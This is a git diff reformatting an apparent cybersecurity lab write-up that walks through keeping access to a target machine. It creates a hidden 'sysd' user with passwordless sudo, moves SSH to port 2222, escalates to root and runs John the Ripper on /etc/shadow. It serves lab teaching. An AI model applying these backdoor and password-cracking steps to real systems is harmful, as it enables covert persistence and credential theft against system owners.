@@ -22,59 +22,71 @@ Accomplishing the goal of maintaining access of a target machine by installing a
 
 ![name-of-you-image](https://github.com/ldover29/Advanced_Bash/blob/a5ca22e065dbd3071b155b1fb557e9ff49bd6103/Images/Step%201%203.jpg)
 
-Give your secret user the same GID:
+4. Give your secret user the same GID:
 
+**usermod -u 50 -g 50 sysd**
 
-usermod -u 50 -g 50 sysd
+![name-of-you-image](https://github.com/ldover29/Advanced_Bash/blob/fee97db46fe2f7011c9efab9fbdb761bf6883380/Images/Step%201%204.jpg)
 
-Give your secret user full sudo access without the need for a password:
+5. Give your secret user full sudo access without the need for a password:
 
+**sysd ALL=(ALL) NOPASSWD:ALL**
 
-sysd ALL=(ALL) NOPASSWD:ALL
+![name-of-you-image](https://github.com/ldover29/Advanced_Bash/blob/fee97db46fe2f7011c9efab9fbdb761bf6883380/Images/Step%201%205.jpg)
 
-Test that sudo access works without your password:
+6. Test that sudo access works without your password:
 
-sudo -l
+**sudo -l**
 
-sudo adduser --system --no-create-home test
+![name-of-you-image](
 
-Step 2: Smooth Sailing
-Edit the sshd_config file:
+**sudo adduser --system --no-create-home test**
 
- Port 2222
+![name-of-you-image](
 
+## Step 2: Smooth Sailing
 
+1. Edit the sshd_config file:
 
-Step 3: Testing Your Configuration Update
-Restart the SSH service:
+**Port 2222**
 
+![name-of-you-image](
 
-systemctl reload sshd
-Exit the root account:
+## Step 3: Testing Your Configuration Update
 
+1. Restart the SSH service:
 
-exit
-SSH to the target machine using your sysd account and port 2222:
+**systemctl reload sshd**
 
+2. Exit the root account:
 
-ssh sysd@192.168.6.105 -p 2222
+**exit**
 
-Use sudo to switch to the root user:
+3. SSH to the target machine using your sysd account and port 2222:
 
+**ssh sysd@192.168.6.105 -p 2222**
 
-sudo su
+![name-of-you-image](
 
-Step 4: Crack All the Passwords
-SSH back to the system using your sysd account and port 2222:
+4. Use sudo to switch to the root user:
 
+**sudo su**
 
-ssh sysd@192.168.6.105 -p 2222
-Escalate your privileges to the root user. Use John to crack the entire /etc/shadow file:
+![name-of-you-image](
 
+## Step 4: Crack All the Passwords
 
-sudo su
-john /etc/shadow
+1. SSH back to the system using your sysd account and port 2222:
+
+**ssh sysd@192.168.6.105 -p 2222**
+
+2. Escalate your privileges to the root user. Use John to crack the entire /etc/shadow file:
+
+**sudo su**
+**john /etc/shadow**
+
+![name-of-you-image](
 
 Passwords:
 
-
+![name-of-you-image](
